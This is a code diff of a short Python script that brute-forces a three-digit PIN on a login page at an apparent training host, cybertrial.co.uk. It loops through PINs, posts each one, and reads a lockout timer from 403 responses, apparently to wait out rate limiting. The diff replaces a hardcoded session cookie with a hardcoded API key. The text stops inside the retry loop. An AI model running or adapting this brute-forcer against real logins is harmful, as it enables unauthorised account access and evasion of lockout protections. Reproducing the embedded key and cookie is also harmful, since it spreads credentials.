@@ -1,19 +1,20 @@
 import re, requests, sys, time
 
 
-url = "http://104.cybertrial.co.uk/login"
-cookies = {"PHPSESSID": "74n3r76demk0hv7kgcio81or5g"}
-timeout = 11
-sess = requests.session()
-
+api_key = "p8nwurRbyxSj3BytLMSumAe3g54H2s5TBwrNdx6K"
 range_start = 600
-range_stop = 800
+range_stop = 700
+url = "http://104.cybertrial.co.uk/login"
+
+sess = requests.session()
+params = {"mykey": api_key}
+sess.get(url, params=params)
 
 for pin in range(range_start, range_stop+1):
     payload = {"formgo": "1",
                "pin": "{0:0=3d}".format(pin)
     }
-    resp = sess.post(url, data=payload, cookies=cookies)
+    resp = sess.post(url, data=payload)
 
     while resp.status_code == 403:
         timeout = re.findall("0000;'>([0-9]*)<\/span", resp.text)[0]
